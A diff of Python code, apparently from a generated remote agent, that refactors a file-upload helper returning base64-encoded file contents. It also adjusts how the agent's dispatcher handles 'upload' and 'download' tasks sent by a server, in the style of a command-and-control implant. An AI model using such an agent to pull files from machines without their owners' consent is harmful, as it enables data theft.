@@ -1713,22 +1713,30 @@ class SystemUtils:
     @staticmethod
     def upload_file(filepath):
         try:
+            filepath = os.path.expandvars(filepath)
             if not os.path.exists(filepath):
-                return {{"error": "File not found"}}
+                return {{'status': 'error', 'message': 'File not found'}}
             
-            if os.path.getsize(filepath) > Config.MAX_UPLOAD_SIZE:
-                return {{"error": "File too large"}}
+            # Use MAX_UPLOAD_SIZE if available, else default to 100MB
+            try:
+                max_size = Config.MAX_UPLOAD_SIZE
+            except:
+                max_size = 100 * 1024 * 1024
+
+            if os.path.getsize(filepath) > max_size:
+                return {{'status': 'error', 'message': 'File too large'}}
             
-            with open(filepath, "rb") as f:
+            with open(filepath, 'rb') as f:
                 file_data = f.read()
             
             return {{
-                "filename": os.path.basename(filepath),
-                "data": base64.b64encode(file_data).decode('utf-8'),
-                "size": len(file_data)
+                'status': 'success',
+                'filename': os.path.basename(filepath),
+                'data': base64.b64encode(file_data).decode('utf-8'),
+                'size': len(file_data)
             }}
         except Exception as e:
-            return {{"error": str(e)}}
+            return {{'status': 'error', 'message': str(e)}}
 
     @staticmethod
     @staticmethod
@@ -3751,7 +3759,10 @@ class Agent:
 
             
             elif task_type == "upload":
-                return SystemUtils.upload_file(task.get("path", ""))
+                task_info = task.get("data", {{}})
+                if not isinstance(task_info, dict):
+                    task_info = task
+                return SystemUtils.upload_file(task_info.get("path", ""))
             
             elif task_type == "download":
                 # The server wraps filename/data inside task[\'data\']
